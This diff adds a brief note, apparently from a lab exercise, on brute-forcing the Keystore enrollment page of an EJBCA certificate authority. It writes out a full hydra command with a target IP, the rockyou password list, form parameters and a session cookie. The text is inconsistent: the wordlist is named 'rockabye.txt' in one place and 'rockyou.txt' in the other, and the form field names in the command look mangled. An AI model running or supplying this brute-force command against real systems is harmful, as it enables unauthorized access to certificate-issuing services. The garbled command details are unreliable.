@@ -1,0 +1,10 @@
+The attack method is a brute force with low and medium-level DVWA standards.
+ 
+The steps:
+1. Inspection of elements of the EJBCA site that have a structure that accepts input related to the identity of the key (on this site it is located in the "Keystore" module)
+
+2. Do a trial and enter username and password credentials in a row to get a certificate to be used as a new "key" from EJBCA.
+
+3. In order to be able to occur in a row, use the hydra tools with a dictionary (rockabye.txt). Execution command:
+
+sudo hydra 192.168.43.100 -l admin -P /home/ihsanfr/Downloads/rockyou.txt http-get-form "/ejbca/enrol/keystore.jsp:textfieldusername=^USER^&textfietfieldpassword:=^PASS^&buttonsubmittusername=OK: Wrong username, enrollment code or user status:H=Cookie: JSESSIONID=wscTYbjZjKi8cj-edQWfjrt8aVq.ihsanfr-x555qgro"
